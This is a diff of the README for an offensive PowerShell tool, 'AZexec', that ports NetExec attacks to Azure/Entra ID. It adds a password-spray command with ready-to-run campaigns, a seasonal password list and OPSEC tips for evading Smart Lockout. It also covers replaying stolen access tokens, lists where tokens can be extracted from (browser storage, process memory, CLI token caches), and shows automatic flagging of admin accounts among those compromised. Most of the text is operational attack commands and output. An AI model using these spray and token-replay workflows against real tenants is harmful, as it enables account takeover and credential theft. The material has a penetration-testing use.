@@ -16,9 +16,11 @@
 
 > **⚡ PASSWORD SPRAY ATTACKS**: AZexec provides a complete password spray workflow using Microsoft's own APIs:
 > 1. **Phase 1** - `users` command: Stealthy username enumeration via GetCredentialType API (no auth logs!)
-> 2. **Phase 2** - `guest` command: ROPC-based credential testing with MFA detection
-> 
-> This two-phase approach is more effective and safer than traditional spraying - only validated usernames are tested, reducing account lockout risk. [See complete workflow →](#password-spray-attack-examples-getcredentialtype--ropc)
+> 2. **Phase 2** - `spray` command: **NEW** NetExec-style password spraying with `-ContinueOnSuccess`, `-NoBruteforce`, `-PasswordFile`, and `-Delay` options
+>
+> The new `spray` command provides NetExec-equivalent functionality: `.\azx.ps1 spray -Domain target.com -UserFile users.txt -PasswordFile passwords.txt -Delay 1800 -ContinueOnSuccess`
+>
+> This two-phase approach is more effective and safer than traditional spraying - only validated usernames are tested, reducing account lockout risk. [See complete workflow →](#enhanced-password-spraying-with-netexec-style-options)
 
 ---
 
@@ -44,6 +46,11 @@ For penetration testers familiar with NetExec (formerly CrackMapExec), here's ho
 | `nxc smb <target> -u <user> -p <pass> --users`<br>`nxc ldap <target> -u <user> -p <pass> --users` | `.\azx.ps1 user-profiles` | ✅ Required | **Enumerate domain users** (authenticated) |
 | `nxc smb --rid-brute` | `.\azx.ps1 rid-brute` | ✅ Required | **Enumerate users by RID bruteforce** (Azure equivalent) |
 | `nxc smb -u 'a' -p ''` | `.\azx.ps1 guest -Domain example.com -Username user -Password ''` | ❌ None | **Test guest/null login** |
+| `nxc smb <target> -u user -p 'pass'` (shows `Pwn3d!`) | `.\azx.ps1 guest -Domain example.com -Username user -Password 'pass'` | ❌ None | **Credential check with admin detection** - shows `(GlobalAdmin!)` etc. |
+| `nxc smb <target> -u user -H 'hash'` (Pass-the-Hash) | `.\azx.ps1 guest -AccessToken "eyJ0eXAi..."` | ❌ None | **Token auth (Pass-the-Hash equivalent)** - test stolen tokens |
+| `nxc smb -u users.txt -p 'Pass'` | `.\azx.ps1 spray -Domain example.com -UserFile users.txt -Password 'Pass'` | ❌ None | **Password spray attack** (NetExec-style) |
+| `nxc smb -u users.txt -p @pass.txt --no-bruteforce` | `.\azx.ps1 spray ... -PasswordFile pass.txt -NoBruteforce` | ❌ None | **Linear pairing** spray (user1:pass1) |
+| `nxc smb -u users.txt -p 'Pass' --continue-on-success` | `.\azx.ps1 spray ... -ContinueOnSuccess` | ❌ None | **Continue after valid creds** found |
 | `nxc smb --groups` | `.\azx.ps1 groups` | ✅ Required | Enumerate groups |
 | `nxc smb --local-group` | `.\azx.ps1 local-groups` | ✅ Required | **Enumerate local groups** (Administrative Units) |
 | `nxc smb --pass-pol` | `.\azx.ps1 pass-pol` | ✅ Required | Display password policies |
@@ -1288,12 +1295,17 @@ All ARM commands share a common multi-subscription enumeration pattern:
   - Export valid usernames for password spray attacks
   - **Enhanced v2.0**: Progress indicators, retry logic, adaptive rate limiting, detailed statistics
 - **Password Spray Attacks**: ROPC-based credential testing (mimics `nxc smb -u users.txt -p 'Pass123'`)
-  - Test single password against multiple users
-  - Support for username:password file format
+  - **NEW: Dedicated `spray` command** with NetExec-style options
+  - Test single or multiple passwords against user lists
+  - `-ContinueOnSuccess`: Keep spraying after finding valid creds (like `--continue-on-success`)
+  - `-NoBruteforce`: Linear pairing mode (user1:pass1, user2:pass2) (like `--no-bruteforce`)
+  - `-PasswordFile`: Load multiple passwords from file (like `-p @file.txt`)
+  - `-Delay`: Configurable delay between password rounds (OPSEC-safe spraying)
   - Automatic lockout detection and account status reporting
   - MFA detection (valid credentials even if MFA blocks)
   - **Two-phase attack**: First enumerate with GetCredentialType, then spray with ROPC
-  - Smart delays to avoid account lockouts
+  - OPSEC warnings display before spray attacks
+  - HTML report export with styled dark theme
 - **Domain User Enumeration**: Comprehensive authenticated user enumeration (mimics `nxc smb/ldap <target> -u <user> -p <pass> --users`)
   - **Azure equivalent of NetExec's SMB/LDAP user enumeration**
   - Enumerate all users in Azure/Entra ID directory with full details
@@ -2991,46 +3003,47 @@ $validExecs | Out-File -FilePath valid-executives.txt
 ```
 
 ### Example 28p: Multi-Password Spray Campaign
-Testing multiple passwords sequentially (with delays to avoid lockouts):
+Testing multiple passwords with built-in delay between rounds (NetExec-style):
 ```powershell
+# Create a password file (one password per line)
+@'
+Summer2024!
+Winter2024!
+Spring2024!
+Fall2024!
+Password123!
+Welcome123!
+TargetCorp2024!
+'@ | Out-File passwords.txt
+
 # Validate usernames first
 .\azx.ps1 users -Domain targetcorp.com -CommonUsernames -ExportPath valid-users.csv
-$validUsers = Import-Csv valid-users.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username
-$validUsers | Out-File spray-targets.txt
+Import-Csv valid-users.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username | Out-File spray-targets.txt
 
-# Password list (seasonal passwords + common patterns)
-$passwords = @(
-    'Summer2024!',
-    'Winter2024!',
-    'Spring2024!',
-    'Fall2024!',
-    'Password123!',
-    'Welcome123!',
-    'TargetCorp2024!'
-)
+# NEW: Use the spray command with built-in delay (30 minutes between password rounds)
+.\azx.ps1 spray -Domain targetcorp.com -UserFile spray-targets.txt -PasswordFile passwords.txt -Delay 1800 -ExportPath spray-results.json
 
-# Spray each password with 30-minute delay between rounds
+# Or continue even after finding valid creds
+.\azx.ps1 spray -Domain targetcorp.com -UserFile spray-targets.txt -PasswordFile passwords.txt -Delay 1800 -ContinueOnSuccess -ExportPath spray-all.json
+
+# Export to HTML for reporting
+.\azx.ps1 spray -Domain targetcorp.com -UserFile spray-targets.txt -PasswordFile passwords.txt -Delay 1800 -ExportPath spray-report.html
+```
+
+**Legacy Method (Manual Loop):**
+```powershell
+# If you prefer the old manual method with more control:
+$passwords = @('Summer2024!', 'Winter2024!', 'Password123!')
+
 foreach ($password in $passwords) {
     Write-Host "`n[*] Testing password: $password"
     .\azx.ps1 guest -Domain targetcorp.com -UserFile spray-targets.txt -Password $password -ExportPath "spray-$password.json"
-    
-    # Wait 30 minutes before next password (avoid account lockouts)
+
     if ($password -ne $passwords[-1]) {
         Write-Host "[*] Waiting 30 minutes before next password spray..."
-        Start-Sleep -Seconds 1800  # 30 minutes
+        Start-Sleep -Seconds 1800
     }
 }
-
-# Consolidate all results
-$allResults = @()
-foreach ($password in $passwords) {
-    $result = Get-Content "spray-$password.json" | ConvertFrom-Json
-    $validCreds = $result.AuthResults | Where-Object { $_.Success -eq $true }
-    $allResults += $validCreds
-}
-
-Write-Host "`n[+] Total valid credentials found: $($allResults.Count)"
-$allResults | Format-Table Username, Password, MFARequired, HasToken
 ```
 
 ### Example 28q: Smart Password Spray - Avoid Known Lockout Thresholds
@@ -6290,6 +6303,234 @@ nxc smb 192.168.1.0/24 -u users.txt -p 'Password123'  # Password spray
 # AZexec equivalent
 .\azx.ps1 users -Domain target.com -CommonUsernames -ExportPath users.csv
 .\azx.ps1 guest -Domain target.com -UserFile users.txt -Password 'Password123'
+```
+
+### Enhanced Password Spraying with NetExec-Style Options
+
+AZexec now includes a dedicated `spray` command with NetExec-style options for enhanced password spraying capabilities:
+
+#### New Parameters
+
+| Parameter | NetExec Equivalent | Description |
+|-----------|-------------------|-------------|
+| `-ContinueOnSuccess` | `--continue-on-success` | Don't stop after finding valid credentials |
+| `-NoBruteforce` | `--no-bruteforce` | Linear pairing (user1:pass1, user2:pass2) instead of matrix |
+| `-PasswordFile` | `-p @file.txt` | Load multiple passwords from file |
+| `-Delay` | N/A | Seconds between password rounds (lockout protection) |
+
+#### Usage Examples
+
+```powershell
+# Basic single password spray (same as guest command)
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -Password 'Summer2024!'
+
+# Multi-password spray with 30-minute delay between rounds (OPSEC-safe)
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -PasswordFile passwords.txt -Delay 1800
+
+# Continue spraying after finding valid credentials
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -Password 'Pass123' -ContinueOnSuccess
+
+# Linear pairing mode (user1 with pass1, user2 with pass2, etc.)
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -PasswordFile passwords.txt -NoBruteforce
+
+# Full attack with HTML report
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -PasswordFile passwords.txt -Delay 1800 -ContinueOnSuccess -ExportPath spray-report.html
+```
+
+#### NetExec Command Mapping
+
+| NetExec | AZexec |
+|---------|--------|
+| `nxc smb <target> -u users.txt -p 'Pass'` | `.\azx.ps1 spray -Domain target.com -UserFile users.txt -Password 'Pass'` |
+| `nxc smb <target> -u users.txt -p 'Pass' --continue-on-success` | `.\azx.ps1 spray ... -ContinueOnSuccess` |
+| `nxc smb <target> -u users.txt -p @pass.txt` | `.\azx.ps1 spray ... -PasswordFile pass.txt` |
+| `nxc smb <target> -u users.txt -p @pass.txt --no-bruteforce` | `.\azx.ps1 spray ... -PasswordFile pass.txt -NoBruteforce` |
+
+#### OPSEC Considerations
+
+The `spray` command displays OPSEC warnings before execution:
+
+```
+[!] ============================================
+[!] OPSEC WARNING - PASSWORD SPRAY ATTACK
+[!] ============================================
+
+[*] Attack Configuration:
+    Users to test:       50
+    Passwords to test:   3
+    Total attempts:      150
+    Attack mode:         Matrix (all combinations)
+    Delay between rounds: 1800 seconds
+    Continue on success: No
+
+[*] Azure AD Smart Lockout Information:
+    Default threshold:   ~10 failed attempts per user
+    Lockout duration:    60 seconds (increases with attempts)
+    Familiar locations:  May have higher threshold
+```
+
+**Recommended OPSEC Settings:**
+- Use `-Delay 1800` (30 minutes) or higher between password rounds
+- Spray only 1-2 passwords per day per user
+- Use `-NoBruteforce` when you have user:password pairs
+- Test against a small subset first to assess lockout policies
+
+#### Attack Modes
+
+**Matrix Mode (Default):**
+Tests all user/password combinations. With 50 users and 3 passwords = 150 attempts.
+
+```powershell
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -PasswordFile passwords.txt
+```
+
+**Linear Pairing Mode (-NoBruteforce):**
+Tests user1 with pass1, user2 with pass2, etc. Useful when you have leaked credential pairs.
+
+```powershell
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -PasswordFile passwords.txt -NoBruteforce
+```
+
+#### Output Formats
+
+The spray command supports multiple export formats:
+
+| Format | Command | Best For |
+|--------|---------|----------|
+| CSV | `-ExportPath results.csv` | Quick analysis, Excel |
+| JSON | `-ExportPath results.json` | Programmatic processing |
+| HTML | `-ExportPath report.html` | Reports, presentations |
+
+---
+
+## 🔐 Checking Credentials (Domain) - Azure's Pwn3d! Equivalent
+
+AZexec provides NetExec's "Checking Credentials (Domain)" functionality - testing credentials and showing privilege level (`Pwn3d!` equivalent) in a single operation.
+
+### NetExec Comparison
+
+**NetExec Commands:**
+```bash
+nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORD'     # Password auth
+nxc smb 192.168.1.0/24 -u UserName -H 'NTHASH'       # Hash auth (Pass-the-Hash)
+```
+
+**NetExec Output:**
+```
+SMB  192.168.1.100  445  DC01  [+] DOMAIN\admin:Password (Pwn3d!)
+SMB  192.168.1.101  445  SRV01 [+] DOMAIN\user:Password
+SMB  192.168.1.102  445  SRV02 [-] DOMAIN\user:Password
+```
+
+**AZexec Equivalent:**
+```powershell
+# Credential check with automatic admin detection
+.\azx.ps1 guest -Domain target.com -Username admin@target.com -Password 'Pass123'
+
+# Token-based auth (Azure's Pass-the-Hash equivalent)
+.\azx.ps1 guest -AccessToken "eyJ0eXAi..."
+```
+
+**AZexec Output:**
+```
+AZR         contoso.com                        443    admin@contoso.com              [+] SUCCESS! Got access token (GlobalAdmin!)
+AZR         contoso.com                        443    secops@contoso.com             [+] SUCCESS! Got access token (SecurityAdmin!)
+AZR         contoso.com                        443    user@contoso.com               [+] SUCCESS! Got access token
+AZR         contoso.com                        443    helpdesk@contoso.com           [+] Valid credentials - MFA REQUIRED
+AZR         contoso.com                        443    locked@contoso.com             [!] ACCOUNT LOCKED
+```
+
+### Automatic Admin Detection
+
+After successful authentication, AZexec **automatically** queries the user's role memberships and displays privilege indicators (NetExec's `Pwn3d!` equivalent):
+
+| Azure Role | Display Indicator | Risk Level |
+|------------|-------------------|------------|
+| Global Administrator | `(GlobalAdmin!)` | CRITICAL |
+| Privileged Role Administrator | `(PrivRoleAdmin!)` | CRITICAL |
+| Privileged Authentication Administrator | `(PrivAuthAdmin!)` | CRITICAL |
+| Security Administrator | `(SecurityAdmin!)` | HIGH |
+| Application Administrator | `(AppAdmin!)` | HIGH |
+| Authentication Administrator | `(AuthAdmin!)` | HIGH |
+| Cloud Application Administrator | `(CloudAppAdmin!)` | HIGH |
+| Conditional Access Administrator | `(CAAdmin!)` | HIGH |
+| Intune Administrator | `(IntuneAdmin!)` | HIGH |
+| User Administrator | `(UserAdmin!)` | MEDIUM |
+| Helpdesk Administrator | `(HelpdeskAdmin!)` | MEDIUM |
+| Password Administrator | `(PasswordAdmin!)` | MEDIUM |
+| Exchange Administrator | `(ExchangeAdmin!)` | MEDIUM |
+| SharePoint Administrator | `(SharePointAdmin!)` | MEDIUM |
+| Teams Administrator | `(TeamsAdmin!)` | MEDIUM |
+| Groups Administrator | `(GroupsAdmin!)` | MEDIUM |
+
+### Token-Based Authentication (Pass-the-Hash Equivalent)
+
+Azure AD doesn't use NTLM hashes, but OAuth2 access tokens serve as the equivalent "credential material" that can be stolen and replayed.
+
+**Why Token Auth Instead of Hash Auth?**
+- Azure AD doesn't use NTLM hashes for authentication
+- OAuth2 access tokens are the equivalent "credential material"
+- Token replay = Azure's Pass-the-Hash
+
+**Token Sources (where attackers extract tokens):**
+- Browser local storage / session storage
+- Process memory (Chrome, Edge, desktop apps)
+- Azure CLI token cache (`~/.azure/accessTokens.json`)
+- Azure PowerShell token cache
+- ADAL/MSAL token caches
+- Keychain (macOS) / Credential Manager (Windows)
+
+**Usage:**
+```powershell
+# Test with stolen/extracted access token
+.\azx.ps1 guest -AccessToken "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs..."
+
+# Output shows username from token and privilege level
+# AZR  <tenant-id>  443  admin@contoso.com  [+] SUCCESS! Token validated (GlobalAdmin!)
+```
+
+### NetExec Command Mapping
+
+| NetExec | AZexec |
+|---------|--------|
+| `nxc smb <target> -u user -p 'pass'` | `.\azx.ps1 guest -Domain target.com -Username user@target.com -Password 'pass'` |
+| Shows `(Pwn3d!)` for admins | Automatic - shows `(GlobalAdmin!)`, `(SecurityAdmin!)`, etc. |
+| `nxc smb <target> -u user -H 'hash'` (Pass-the-Hash) | `.\azx.ps1 guest -AccessToken "eyJ0eXAi..."` |
+
+### Technical Implementation
+
+**Privilege Check Process:**
+1. After successful ROPC authentication, we get an access token
+2. Use the token to query `https://graph.microsoft.com/v1.0/me/transitiveMemberOf/microsoft.graph.directoryRole`
+3. Compare role template IDs against known privileged roles
+4. Display the highest-risk privilege indicator
+
+**Required Graph API Scope:**
+- `RoleManagement.Read.Directory` or `Directory.Read.All`
+- If the token lacks these scopes, privilege check is silently skipped
+
+**Rate Limiting Considerations:**
+- Automatic admin check adds 1-2 Graph API calls per successful auth
+- Only runs on SUCCESSFUL authentications (not failures)
+- Acceptable overhead even for large spray operations
+
+### Usage Examples
+
+```powershell
+# Single credential check with automatic admin detection
+.\azx.ps1 guest -Domain target.com -Username admin@target.com -Password 'Summer2024!'
+# Output: AZR contoso.com 443 admin@contoso.com [+] SUCCESS! Got access token (GlobalAdmin!)
+
+# Password spray - automatically detects admin on each valid credential
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -Password 'Summer2024!'
+
+# Token-based auth - test a stolen access token
+.\azx.ps1 guest -AccessToken "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs..."
+# Username extracted from token claims automatically
+
+# Export results with privilege data
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -Password 'Pass' -ExportPath results.json
+# JSON includes: PrivilegeLevel, PrivilegeDisplay, PrivilegedRoles array
 ```
 
 ---
